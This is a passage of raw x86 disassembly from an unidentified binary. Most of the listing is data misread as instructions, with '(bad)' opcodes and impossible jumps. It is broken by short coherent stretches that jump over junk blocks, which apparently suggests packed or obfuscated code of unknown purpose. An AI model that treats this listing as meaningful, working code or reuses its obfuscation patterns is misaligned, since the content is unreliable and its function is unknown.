  4051ef:	dec    esi
  4051f0:	push   cs
  4051f1:	es inc eax
  4051f3:	fs rol ah,cl
  4051f6:	mov    ebp,0xaa38eee5
  4051fb:	cld    
  4051fc:	rcr    BYTE PTR ss:[esi],0xba
  405200:	xor    edx,edi
  405202:	repz sbb DWORD PTR ss:[eax+0x18],eax
  405207:	jmp    0x5940:0x5eb4b635
  40520e:	pop    ss
  40520f:	lods   al,BYTE PTR ds:[esi]
  405210:	inc    ebp
  405211:	ins    BYTE PTR es:[edi],dx
  405212:	jmp    0x32e2764
  405217:	imul   ebx,DWORD PTR [ecx+0x57],0x88f98353
  40521e:	add    ecx,0x63e3b43e
  405224:	adc    cl,bh
  405226:	fild   WORD PTR ds:0xa858249a
  40522c:	jns    0x405234
  40522e:	add    al,0xf5
  405230:	and    al,0xe
  405232:	fs xchg edi,eax
  405234:	jg     0x40526f
  405236:	ror    DWORD PTR [ecx+0x55],0x94
  40523a:	std    
  40523b:	mov    DWORD PTR [ebp+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0xbf6a2839
  40528d:	mov    esi,0x7e7e2a5b
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x4052ef
  405297:	push   ebx
  405298:	pushf  
  405299:	mov    esi,0x631d1bab
  40529e:	push   ebp
  40529f:	cli    
  4052a0:	jg     0x40522e
  4052a2:	es cmp eax,0x78b2f608
  4052a8:	mov    edx,DWORD PTR [ebx]
  4052aa:	fstp   TBYTE PTR [eax+ebp*4-0x48c68b41]
  4052b1:	(bad)  
  4052b2:	mov    eax,ds:0x137d4edd
  4052b7:	ins    DWORD PTR es:[edi],dx
  4052b8:	fidivr WORD PTR [ecx+0x58eefb0]
  4052be:	ret    0xd60a
  4052c1:	rol    edx,1
  4052c3:	xor    ecx,DWORD PTR [edx-0x5e]
  4052c6:	jp     0x4052cd
  4052c8:	test   al,0xea
  4052ca:	sbb    ah,BYTE PTR [eax+0xa]
  4052cd:	(bad)  
  4052ce:	ins    DWORD PTR es:[edi],dx
  4052cf:	sbb    eax,0xbbd79a2
  4052d4:	shl    BYTE PTR [esi-0x43e24aba],1
  4052da:	and    DWORD PTR [ecx],0x17c1512e
  4052e0:	mov    cl,0x27
  4052e2:	xor    al,BYTE PTR [edi+0x51b2a074]
  4052e8:	jecxz  0x405298
  4052ea:	cmc    
  4052eb:	xor    al,0xa9
  4052ed:	cmp    eax,0x55888ecc
  4052f2:	mov    ds:0x72442d18,al
  4052f7:	xor    dl,cl
  4052f9:	sub    ch,BYTE PTR [ebx]
  4052fb:	and    bh,dh
  4052fd:	push   ss
  4052fe:	stc    
  4052ff:	popf   
  405300:	call   0x5197aae7
  405305:	out    dx,eax
  405306:	enter  0xdde4,0xbc
  40530a:	xchg   esi,eax
  40530b:	sub    esi,DWORD PTR [edx]
  40530d:	not    DWORD PTR [ecx-0x5a597bcd]
  405313:	push   edi
  405314:	inc    ecx
  405315:	pushf  
  405316:	pop    ebx
  405317:	sub    DWORD PTR [edx+edx*8+0x509a9ba7],ebx
  40531e:	lea    bp,fs:[edx+esi*1-0x416a05e2]
  405327:	popa   
  405328:	push   ss
  405329:	popa   
  40532a:	rcl    DWORD PTR [ebp+0x66106875],1
  405330:	pop    edx
  405331:	outs   dx,DWORD PTR ds:[esi]
  405332:	in     eax,dx
  405333:	test   BYTE PTR [esi-0x6f],bl
  405336:	dec    edi
  405337:	jae    0x40538c
  405339:	push   ss
  40533a:	inc    esp
  40533b:	cs push edx
  40533d:	addr16 mov bl,0xb1
  405340:	int3   
  405341:	sub    al,0xa9
  405343:	js     0x4052f9
  405345:	sub    dl,BYTE PTR [eax+0x6c]
  405348:	fs ret 0xc541
  40534c:	test   BYTE PTR [esi+0x55],0xb5
  405350:	mov    bl,0xfa
  405352:	mov    ds:0x4374bdab,al
  405357:	inc    esp
  405358:	add    eax,0x772ac8e5
  40535d:	and    edi,DWORD PTR [esi-0x693478e0]
  405363:	repz xchg edi,eax
  405365:	mov    ds:0xca542956,al
  40536a:	inc    esp
  40536b:	or     esi,esp
  40536d:	les    edx,FWORD PTR [edx+0x67366671]
  405373:	lea    esi,[ecx-0x54]
  405376:	rol    dl,cl
  405378:	inc    ecx
  405379:	stos   BYTE PTR es:[edi],al
  40537a:	fisttp QWORD PTR [ebx+0x60]
  40537d:	shl    esi,1
  40537f:	imul   edx,DWORD PTR [ebp+edi*4+0x4a02770],0x5
  405387:	adc    dh,bh
  405389:	das    
  40538a:	dec    ebx
  40538b:	fst    DWORD PTR [edi-0x16]
  40538e:	int3   
  40538f:	neg    dl
  405391:	mov    ebx,0xd28e6c84
  405396:	jmp    0x39c1155f
  40539b:	inc    edx
  40539c:	mov    ebx,0x4f1d3c4d
  4053a1:	cmp    dl,BYTE PTR [esi]
  4053a3:	adc    al,0xb
  4053a5:	out    dx,eax
  4053a6:	cs dec edi
  4053a8:	sbb    BYTE PTR ds:0xb912cbdc,al
  4053ae:	sti    
  4053af:	(bad)  
  4053b0:	mov    eax,ds:0xb1760a08
  4053b5:	sub    al,0xca
  4053b7:	pusha  
  4053b8:	xor    al,0x67
  4053ba:	sbb    eax,esp
  4053bc:	clc    
  4053bd:	jno    0x4053ae
  4053bf:	std    
  4053c0:	stc    
  4053c1:	mov    al,0xcc
  4053c3:	fwait
  4053c4:	adc    eax,0xd9c23e14
  4053c9:	in     al,0x7c
  4053cb:	pop    esi
  4053cc:	sub    al,BYTE PTR [ebp-0xb]
  4053cf:	sar    BYTE PTR [ebx+0x7],cl
  4053d2:	fucomip st,st(2)
  4053d4:	push   edi
  4053d5:	dec    eax
  4053d6:	or     al,0x6e
  4053d8:	sbb    eax,0x1c
  4053db:	(bad)  
  4053dc:	and    edx,DWORD PTR [ebp+0x2e]
  4053df:	stos   DWORD PTR es:[edi],eax
  4053e0:	and    al,0xe4
  4053e2:	js     0x405408
  4053e4:	pop    ebp
  4053e5:	loope  0x405369
  4053e7:	loope  0x405377
  4053e9:	adc    edi,edx
  4053eb:	outs   dx,DWORD PTR ds:[esi]
  4053ec:	or     BYTE PTR [edi],dh
  4053ee:	fst    QWORD PTR [esi-0x4]
  4053f1:	inc    esi
  4053f2:	stos   BYTE PTR es:[edi],al
  4053f3:	adc    al,BYTE PTR [ebx+eiz*8-0xb]
  4053f7:	test   DWORD PTR [esi-0x62b5a725],ebx
  4053fd:	lods   al,BYTE PTR ds:[esi]
  4053fe:	fwait
  4053ff:	add    eax,0xad988a23
  405404:	popf   
  405405:	mov    ebx,0x82caf94e
  40540a:	mov    eax,0xe8b2dc95
  40540f:	jns    0x405448
  405411:	pop    ds
  405412:	inc    edx
  405413:	sbb    ebx,DWORD PTR [eax+0x27]
  405416:	stc    
  405417:	les    ecx,FWORD PTR [eax-0x6b41b6ae]
  40541d:	lds    ecx,FWORD PTR [esi-0x4226ce54]
  405423:	je     0x4053a5
  405425:	push   edx
  405426:	test   eax,0x1019fa7b
  40542b:	and    eax,0xca301365
  405430:	push   ds
  405431:	jb     0x405488
  405433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405434:	add    BYTE PTR [ecx-0x30],bh
  405437:	stos   BYTE PTR es:[edi],al
  405438:	add    al,0xd6
  40543a:	into   
  40543b:	mov    al,ds:0x466df90f
  405440:	push   0xffffffa1
  405442:	stc    
  405443:	sbb    BYTE PTR [ebp+0x1876a13a],0x31
  40544a:	mov    dl,0x1e
  40544c:	nop
  40544d:	fild   QWORD PTR [ebx-0x2f1c5873]
  405453:	mov    ebx,0xc7882936
  405458:	adc    DWORD PTR [edx+0x6e],ecx
  40545b:	add    al,bh
  40545d:	or     ch,BYTE PTR [eax-0x13]
  405460:	xchg   cl,bh
  405462:	(bad)  
  405463:	clc    
  405464:	in     eax,0x8f
  405466:	push   ss
  405467:	cmp    al,0x34
  405469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40546a:	dec    ecx
  40546b:	xchg   DWORD PTR [ebp-0x45],eax
  40546e:	xchg   edi,eax
  40546f:	dec    ebx
  405470:	or     al,0xae
  405472:	fst    QWORD PTR [edi-0x7c58b01c]
  405478:	rol    DWORD PTR [eax+edx*1],cl
  40547b:	div    DWORD PTR [edx+0xe873d6e]
  405481:	enter  0xecc1,0xa6
  405485:	add    bh,BYTE PTR [ebx+0x37]
  405488:	sbb    ecx,esi
  40548a:	xor    al,0xff
  40548c:	and    esp,eax
  40548e:	lds    ebp,FWORD PTR [ecx]
  405490:	mov    edx,0xcb1021d
  405495:	jns    0x405503
  405497:	stos   BYTE PTR es:[edi],al
  405498:	sbb    BYTE PTR [ecx+0x36a94138],bh
  40549e:	mov    ds:0xe5d28c27,eax
  4054a3:	add    BYTE PTR [edx+0x69d280ce],bh
  4054a9:	ds jmp 0xd14d4709
  4054af:	dec    eax
  4054b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054b1:	aad    0xa7
  4054b3:	fld    TBYTE PTR [edi+ebx*4+0x27]
  4054b7:	fs mov ecx,0xfc7411d3
  4054bd:	mov    eax,ds:0x9868c15e
  4054c2:	(bad)  
  4054c3:	daa    
  4054c4:	push   eax
  4054c5:	cmp    ecx,DWORD PTR [ebp-0x3a74e4af]
  4054cb:	and    al,0xc
  4054cd:	mov    ds:0xf12f4206,eax
  4054d2:	cmc    
  4054d3:	imul   ecx,DWORD PTR [esi],0xbb1b8259
  4054d9:	or     eax,0x1f08db00
  4054de:	rcr    ecx,0x6f
  4054e1:	mov    ds:0x33ecd0f1,al
  4054e6:	add    esp,esp
  4054e8:	daa    
  4054e9:	js     0x4054ef
  4054eb:	(bad)
  4054ef:	push   eax
  4054f0:	fcomp  QWORD PTR [ebp-0x12]
  4054f3:	daa    
  4054f4:	inc    edx
  4054f5:	mov    cs,WORD PTR [eax+0x22017d36]
  4054fb:	sub    DWORD PTR [esi],esp
  4054fd:	clc    
  4054fe:	mov    edx,0xe3f2b265
  405503:	retf   0xf671
  405506:	ds pop es
  405508:	nop
  405509:	lods   al,BYTE PTR ds:[esi]
  40550a:	lods   eax,DWORD PTR ds:[esi]
  40550b:	dec    ebx
  40550c:	daa    
  40550d:	xchg   esp,eax
  40550e:	dec    ebp
  40550f:	pop    esp
  405510:	and    al,0xab
  405512:	xchg   edx,eax
  405513:	cmp    al,0xed
  405515:	jnp    0x405548
  405517:	xchg   ecx,eax
  405518:	lahf   
  405519:	or     ebx,DWORD PTR [eax+0x35d567de]
  40551f:	push   es
  405520:	or     eax,0xb2730dae
  405525:	mov    ebp,0xe419e3d6
  40552a:	mov    esi,0x90f432e5
  40552f:	neg    DWORD PTR [ebx-0x41]
  405532:	lods   eax,DWORD PTR ds:[esi]
  405533:	dec    ecx
  405534:	mov    al,0xb8
  405536:	jg     0x405527
  405538:	jmp    FWORD PTR [esi]
  40553a:	pushf  
  40553b:	sub    BYTE PTR [ebx+0x5],al
  40553e:	jg     0x405557
  405540:	or     al,0xe6
  405542:	and    eax,0xb837209a
  405547:	rol    DWORD PTR [ebp+0x55433e16],0x7c
  40554e:	inc    eax
  40554f:	jne    0x4055bb
  405551:	mul    DWORD PTR [esi+eax*4-0x457ee8e4]
  405558:	ins    DWORD PTR es:[edi],dx
  405559:	test   al,0xa1
  40555b:	inc    edx
  40555c:	imul   BYTE PTR [esi+0x29682a50]
  405562:	stos   BYTE PTR es:[edi],al
  405563:	iret   
  405564:	call   0xf941:0x8aa3067e
  40556b:	int3   
  40556c:	call   0xabcc:0xdcbac912
  405573:	xchg   ecx,eax
  405574:	bound  ecx,QWORD PTR [ebx+0x37859245]
  40557a:	inc    ebx
  40557b:	es jge 0x4055d0
  40557e:	lea    esi,[ebx+ebx*8-0x7571ac94]
  405585:	retf   
  405586:	mov    dh,0xd4
  405588:	adc    DWORD PTR [ebx+0x1f],eax
  40558b:	int    0xd3
  40558d:	cmp    al,0xf4
  40558f:	push   ds
  405590:	cmp    eax,0xba697605
  405595:	add    eax,0x7ecb6dc6
  40559a:	push   esp
  40559b:	ja     0x405575
  40559d:	gs inc edi
  40559f:	pop    ss
  4055a0:	aaa    
  4055a1:	retf   
  4055a2:	xchg   ebp,eax
  4055a3:	mov    edx,DWORD PTR [ebp+0x3d]
  4055a6:	cli    
  4055a7:	(bad)  
  4055a8:	jne    0x4055c9
  4055aa:	ret    0xe2a
  4055ad:	sahf   
  4055ae:	push   0x3356886e
  4055b3:	lahf   
  4055b4:	inc    esi
  4055b5:	fnstenv [edi+0x76769670]
  4055bb:	jno    0x4055e4
  4055bd:	jge    0x4055d0
  4055bf:	mov    dl,0xad
  4055c1:	das    
  4055c2:	inc    ebp
  4055c3:	push   eax
  4055c4:	inc    edx
  4055c5:	jp     0x405630
  4055c7:	aaa    
  4055c8:	push   esp
  4055c9:	mov    bh,0x80
  4055cb:	xor    edx,edi
  4055cd:	outs   dx,DWORD PTR ds:[esi]
  4055ce:	fisttp DWORD PTR [ebx-0x19]
  4055d1:	jne    0x4055fc
  4055d3:	sbb    al,0x9e
  4055d5:	or     esp,DWORD PTR [ecx-0x3f]
  4055d8:	or     DWORD PTR [eax-0x47aedc56],0xffffff9f
  4055df:	cld    
  4055e0:	mov    ds:0xfc458905,eax
  4055e5:	mov    DWORD PTR ds:0x434673,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	outs   dx,BYTE PTR cs:[esi]
  405604:	ins    BYTE PTR es:[edi],dx
  405605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405606:	inc    eax
  405607:	and    DWORD PTR [esi],esi
  405609:	jle    0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x40561c
  405610:	xchg   edx,eax
  405611:	push   0x10
  405613:	push   esp
  405614:	sti    
  405615:	adc    DWORD PTR [eax+ebx*1-0x4e],ebp
  405619:	rol    BYTE PTR [edx],1
  40561b:	gs jle 0x405656
  40561e:	mov    ebp,0xb0e94d1e
  405623:	pop    fs
  405625:	std    
  405626:	pop    ecx
  405627:	(bad)  
  405628:	xor    eax,0x862c835a
  40562d:	rcr    BYTE PTR [ebx-0x25],0xde
  405631:	add    ch,BYTE PTR [esi+edi*8-0x3f7ad111]
  405638:	dec    ecx
  405639:	outs   dx,BYTE PTR ds:[esi]
  40563a:	jp     0x4055cf
  40563c:	or     BYTE PTR [ebx-0x79],dl
  40563f:	mov    esi,0xe4680b6b
  405644:	xor    edi,DWORD PTR [edx-0x59222acf]
  40564a:	loopne 0x40568d
  40564c:	pop    ds
  40564d:	in     al,dx
  40564e:	xlat   BYTE PTR fs:[ebx]
  405650:	je     0x40563f
  405652:	cmp    cl,BYTE PTR [esi-0xb44cd32]
  405658:	inc    edx
  405659:	in     eax,0xa5
  40565b:	cmp    eax,0xdac557d7
  405660:	add    BYTE PTR ds:0xce9cdbfb,0x6d
  405667:	pusha  
  405668:	gs jmp 0x8082:0xb7759b32
  405670:	or     BYTE PTR [edx],dh
  405672:	inc    ebp
  405673:	inc    edx
  405674:	ins    DWORD PTR es:[edi],dx
  405675:	or     ebp,edi
  405677:	outs   dx,DWORD PTR ds:[esi]
  405678:	ror    BYTE PTR [esi-0x47bd3756],cl
  40567e:	stc    
  40567f:	shl    DWORD PTR [eax+0x28],0xec
  405683:	dec    edx
  405684:	ins    DWORD PTR es:[edi],dx
  405685:	cmc    
  405686:	aaa    
  405687:	mov    al,0xd8
  405689:	sub    DWORD PTR [bx+di-0x58],ebp
  40568d:	cmp    ebp,edx
  40568f:	hlt    
  405690:	and    BYTE PTR [edi],cl
  405692:	lahf   
  405693:	inc    edi
  405694:	in     al,0x4f
  405696:	popf   
  405697:	cmp    dl,cl
  405699:	or     DWORD PTR [ecx-0x46],eax
  40569c:	repz fs dec ebp
  40569f:	iret   
  4056a0:	(bad)  
  4056a2:	mov    esp,0xf4f1f0de
  4056a7:	adc    ecx,DWORD PTR [esi-0x7f41b148]
  4056ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056ae:	sub    bh,BYTE PTR [ebx+0x4b]
  4056b1:	out    0x98,eax
  4056b3:	adc    edx,DWORD PTR [edx]
  4056b5:	ins    DWORD PTR es:[edi],dx
  4056b6:	lods   eax,DWORD PTR ds:[esi]
  4056b7:	pop    ss
  4056b8:	xchg   esi,eax
  4056b9:	test   BYTE PTR [esi+0x11],ah
  4056bc:	in     eax,0xd2
  4056be:	into   
  4056bf:	inc    edi
  4056c0:	xlat   BYTE PTR ds:[ebx]
  4056c1:	push   ds
  4056c2:	leave  
  4056c3:	scas   al,BYTE PTR es:[edi]
  4056c4:	sbb    eax,0x648db23d
  4056c9:	mov    ah,0x8c
  4056cb:	or     DWORD PTR [edi],ebx
  4056cd:	repz (bad) [edx+0x2e]
  4056d1:	push   esi
  4056d2:	jge    0x4056d3
  4056d4:	or     eax,0x55df1fe6
  4056d9:	cld    
  4056da:	test   DWORD PTR [esi-0x57],0x5b5ebb3d
  4056e1:	pop    ebx
  4056e2:	pushf  
  4056e3:	rep lods eax,DWORD PTR ds:[esi]
  4056e5:	cmp    eax,0xd7551b94
  4056ea:	les    esp,FWORD PTR [edi+0x1241e1d0]
  4056f0:	ins    BYTE PTR es:[edi],dx
  4056f1:	add    BYTE PTR [ecx-0x75],dh
  4056f4:	std    
  4056f5:	mov    ?,WORD PTR [ecx-0x54]
  4056f8:	ja     0x405748
  4056fa:	adc    ch,BYTE PTR [esi]
  4056fc:	inc    edi
  4056fd:	mov    ds:0xd2d9e9a2,eax
  405702:	pop    es
  405703:	jmp    0x98bec1e5
  405708:	retf   0x6a71
  40570b:	mov    DWORD PTR [edx],esp
  40570d:	popf   
  40570e:	pop    ebx
  40570f:	lds    edi,FWORD PTR [esp+ebx*4+0x55e7b6ed]
  405716:	pop    ds
  405717:	in     eax,dx
  405718:	lods   eax,DWORD PTR ds:[esi]
  405719:	xchg   edx,eax
  40571a:	dec    eax
  40571b:	outs   dx,BYTE PTR ds:[esi]
  40571c:	add    al,0x1f
  40571e:	pop    ebp
  40571f:	mov    al,0x81
  405721:	inc    edx
  405722:	mov    ecx,cs
  405724:	mov    ds:0x9853dccc,al
  405729:	inc    edi
  40572a:	pop    es
  40572b:	jbe    0x405722
  40572d:	sar    DWORD PTR [eax+esi*1],1
  405730:	cld    
  405731:	leave  
  405732:	ftst   
  405734:	or     al,bl
  405736:	jecxz  0x405718
  405738:	or     ch,BYTE PTR [eax-0x20e6bdac]
  40573e:	aas    
  40573f:	fscale 
  405741:	imul   edx,DWORD PTR [edi+0x39],0xe54cdfe1
  405748:	out    0xee,al
  40574a:	in     al,dx
  40574b:	xchg   edi,eax
  40574c:	mul    DWORD PTR ds:[edx+edi*8-0x1eac99fb]
  405754:	shr    BYTE PTR [ebx-0x5c],cl
  405757:	sbb    eax,0xfc1c5c39
  40575c:	adc    eax,0xa97c07b4
  405761:	loop   0x4057bd
  405763:	ins    DWORD PTR es:[edi],dx
  405764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405765:	mov    ebx,0x5fea0b60
  40576a:	in     eax,0x25
  40576c:	jmp    0x189e:0x3c28507a
  405773:	dec    DWORD PTR [edi+edx*4-0x326dcb5a]
  40577a:	inc    edi
  40577b:	gs jge 0x40570b
  40577e:	test   ebx,esi
  405780:	or     ebp,DWORD PTR [ecx-0x709bfe43]
  405786:	push   0x6e
  405788:	dec    edi
  405789:	fidivr WORD PTR [esi+edx*2]
  40578c:	xor    eax,0x2d0d8a97
  405791:	sub    eax,0x6d4f2410
  405796:	adc    bh,BYTE PTR [edi]
  405798:	inc    eax
  405799:	sub    ecx,DWORD PTR [ecx-0x4b574bb1]
  40579f:	mov    ecx,0x40778309
  4057a4:	data16 repnz mov bh,0xa
  4057a8:	xchg   edi,eax
  4057a9:	inc    eax
  4057aa:	mov    ch,0x66
  4057ac:	stos   BYTE PTR es:[edi],al
  4057ad:	mov    WORD PTR [ecx+0x5166f694],gs
  4057b3:	add    ecx,DWORD PTR [edi-0x72e92ff8]
  4057b9:	(bad)  
  4057ba:	cli    
  4057bb:	ror    BYTE PTR [edi+0x4],cl
  4057be:	and    eax,0x621ac60c
  4057c3:	repnz mov bh,0x99
  4057c6:	pop    ecx
  4057c7:	sets   BYTE PTR [edx-0x7e]
  4057cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057cc:	sbb    eax,0xc759ce6d
  4057d1:	add    bl,ah
  4057d3:	fld    TBYTE PTR [ebx+0x7a60e03]
  4057d9:	or     DWORD PTR [edi],ecx
  4057db:	xlat   BYTE PTR ds:[ebx]
  4057dc:	lods   al,BYTE PTR ds:[esi]
  4057dd:	mov    dl,0x7c
  4057df:	pushf  
  4057e0:	and    ecx,ecx
  4057e2:	adc    DWORD PTR [ecx+0x21],edi
  4057e5:	or     al,BYTE PTR [ebp-0x1298340]
  4057eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057ec:	leave  
  4057ed:	pop    es
  4057ee:	loope  0x4057fa
  4057f0:	dec    ebx
  4057f1:	ja     0x405806
  4057f3:	cmp    ebx,0xc7d5bbf4
  4057f9:	in     al,0xbc
  4057fb:	call   0x79a5b102
  405800:	or     BYTE PTR [ecx+ebp*4+0x4aee7677],0x63
  405808:	lahf   
  405809:	and    edi,DWORD PTR [ebx+0x3385d088]
  40580f:	out    dx,eax
  405810:	pop    ebp
  405811:	fsubr  DWORD PTR [ebp+0x5f863e87]
  405817:	js     0x405818
  405819:	pop    ecx
  40581a:	popf   
  40581b:	sbb    BYTE PTR [edx-0x6e69ad53],0x14
  405822:	jle    0x4057ec
  405824:	sub    BYTE PTR [esi-0x30],dh
  405827:	bswap  esp
  405829:	into   
  40582a:	sub    dl,BYTE PTR es:[edx+eiz*4-0x46c0c765]
  405832:	and    dh,BYTE PTR [edx]
  405834:	fst    DWORD PTR [ebp-0x3757cb09]
  40583a:	sbb    BYTE PTR [edx-0x58],al
  40583d:	xor    eax,0x75772695
  405842:	push   ss
  405843:	nop
  405844:	mov    ebx,0xe714b0e5
  405849:	rcl    esi,0x34
  40584c:	mov    eax,ds:0x12d7ef11
  405851:	sub    dh,ch
  405853:	push   edx
  405854:	into   
  405855:	xchg   ebp,eax
  405856:	mov    dl,0xfb
  405858:	and    DWORD PTR [eax],eax
  40585a:	xchg   edi,eax
  40585b:	out    0xde,al
  40585d:	cmp    BYTE PTR [eax+ebx*1-0x20c97789],bl
  405864:	xor    BYTE PTR [eax+0x2d],al
  405867:	mov    ds:0x8d49cbcd,eax
  40586c:	push   ss
  40586d:	fadd   st(6),st
  40586f:	ss and al,0x40
  405872:	shl    DWORD PTR [ebx-0xdccff73],0xfc
  405879:	inc    edi
  40587a:	or     DWORD PTR [esi+0x5d6cba90],ebx
  405880:	lahf   
  405881:	push   esp
  405882:	jmp    0x2f1b5815
  405887:	mov    ds:0x98770013,al
  40588c:	jb     0x405901
  40588e:	(bad)  
  40588f:	push   ebx
  405890:	add    ebx,esp
  405892:	lahf   
  405893:	add    bl,BYTE PTR [edi+esi*4-0x11]
  405897:	loope  0x405892
  405899:	mov    ds:0x607e1c0,al
  40589e:	sti    
  40589f:	push   cs
  4058a0:	ins    BYTE PTR es:[edi],dx
  4058a1:	out    dx,eax
  4058a2:	scas   al,BYTE PTR es:[edi]
  4058a3:	inc    edx
  4058a4:	push   esp
  4058a5:	adc    cl,bl
  4058a7:	std    
  4058a8:	mov    ah,0xf3
  4058aa:	or     al,0x8f
  4058ac:	xor    bh,BYTE PTR [edx-0x23205edd]
  4058b2:	hlt    
  4058b3:	cld    
  4058b4:	mov    esi,0x58e8c9c5
  4058b9:	jae    0x405874
  4058bb:	or     esi,DWORD PTR [ebp-0x31]
  4058be:	sahf   
  4058bf:	cdq    
  4058c0:	clc    
  4058c1:	pop    ebx
  4058c2:	pop    ebx
  4058c3:	cmp    DWORD PTR [ebp-0x5e],esi
  4058c6:	ret    
  4058c7:	sub    DWORD PTR [edx+0x78],0x6e
  4058cb:	jg     0x4058ed
  4058cd:	jb     0x405910
  4058cf:	sub    DWORD PTR [esi],edx
  4058d1:	ror    DWORD PTR [ecx+edi*8],cl
  4058d4:	push   edi
  4058d5:	das    
  4058d6:	inc    ecx
  4058d7:	imul   esi,DWORD PTR [edi-0x332755ea],0xf213050a
  4058e1:	pop    ecx
  4058e2:	mov    edx,ecx
  4058e4:	aad    0x6
  4058e6:	lods   eax,DWORD PTR ds:[esi]
  4058e7:	sub    dh,bl
  4058e9:	xchg   edi,eax
  4058ea:	xchg   esp,eax
  4058eb:	mov    dl,0xe6
  4058ed:	sbb    DWORD PTR [edx+0x3b544b32],0xffffffd9
  4058f4:	popa   
  4058f5:	fld    TBYTE PTR [edx-0xe]
  4058f8:	adc    ebx,eax
  4058fa:	in     eax,0x99
  4058fc:	adc    BYTE PTR [edi+0x51],ch
  4058ff:	(bad)  [eax-0x55]
  405902:	ret    
  405903:	and    al,ch
  405905:	loop   0x4058a4
  405907:	jg     0x4058cd
  405909:	or     esi,DWORD PTR [esi]
  40590b:	stos   DWORD PTR es:[edi],eax
  40590c:	cmp    eax,ebp
  40590e:	sub    esi,DWORD PTR [edi-0x708010e0]
  405914:	jb     0x40597f
  405916:	add    esi,ebp
  405918:	adc    ebp,DWORD PTR [eax]
  40591a:	out    0x71,eax
  40591c:	rcl    BYTE PTR [ecx-0x43],cl
  40591f:	jno    0x40595b
  405921:	pushf  
  405922:	jae    0x405933
  405924:	addr16 pop edx
  405926:	lea    esi,[ebx]
  405928:	fld    TBYTE PTR [esi-0x57]
  40592b:	arpl   WORD PTR [esi],bp
  40592d:	dec    ecx
  40592e:	push   ebx
  40592f:	pop    ebp
  405930:	xchg   BYTE PTR [eax],dl
  405932:	fsubr  QWORD PTR [ecx+0x15]
  405935:	daa    
  405936:	scas   eax,DWORD PTR es:[edi]
  405937:	out    dx,al
  405938:	ins    BYTE PTR es:[edi],dx
  405939:	ret    
  40593a:	add    al,0xa7
  40593c:	fadd   st(6),st
  40593e:	sbb    dl,bh
  405940:	ins    DWORD PTR es:[edi],dx
  405941:	(bad)  
  405942:	sti    
  405943:	imul   esp,DWORD PTR [edx+0x31],0x8bdfa65a
  40594a:	clc    
  40594b:	inc    edx
  40594c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40594d:	xchg   edx,eax
  40594e:	inc    esi
  40594f:	mov    eax,0x45deb6c3
  405954:	outs   dx,DWORD PTR ds:[esi]
  405955:	mov    DWORD PTR [ebp-0x8],0x4f39
  40595c:	mov    DWORD PTR ds:0x434753,0x224a
  405966:	jmp    0x405cc9
  40596b:	mov    edx,0x71b8a1ab
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	xor    ebx,DWORD PTR [ebp+0x31ef44f5]
  40597d:	jle    0x4059fd
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x4059c8
  405984:	icebp  
  405985:	test   eax,0x418c5673
  40598a:	repz pop ebp
  40598c:	retf   0x2b06
  40598f:	jno    0x4059ee
  405991:	js     0x4059db
  405993:	lock xchg ebx,eax
  405995:	lods   eax,DWORD PTR ds:[esi]
  405996:	mov    esp,0x421bbd16
  40599b:	call   0x25932aff
  4059a0:	mov    edi,esi
  4059a2:	push   esp
  4059a3:	mov    edx,0x324121a9
  4059a8:	and    bl,BYTE PTR [esi-0xcb78a12]
  4059ae:	sub    DWORD PTR [ebx+0x4],eax
  4059b1:	mov    BYTE PTR [edi+0x766b81ae],ah
  4059b7:	or     edx,DWORD PTR [eax-0x60]
  4059ba:	mov    dl,0x92
  4059bc:	push   eax
  4059bd:	data16 cmc 
  4059bf:	sbb    DWORD PTR [edi-0x72],ebx
  4059c2:	test   DWORD PTR [ebp-0x7f],edi
  4059c5:	xor    dl,BYTE PTR [ecx]
  4059c7:	cli    
  4059c8:	rcl    BYTE PTR [ebx+esi*4],1
  4059cb:	outs   dx,BYTE PTR ds:[esi]
  4059cc:	scas   eax,DWORD PTR es:[edi]
  4059cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ce:	jo     0x4059a0
  4059d0:	mov    ds:0xf98ca65e,eax
  4059d5:	mov    ds:0x65a6c31,al
  4059da:	aad    0xb4
  4059dc:	push   ebp
  4059dd:	inc    ecx
  4059de:	out    0x53,eax
  4059e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e1:	test   DWORD PTR [esi],ebp
  4059e3:	cli    
  4059e4:	fsubrp st(1),st
  4059e6:	pop    ebp
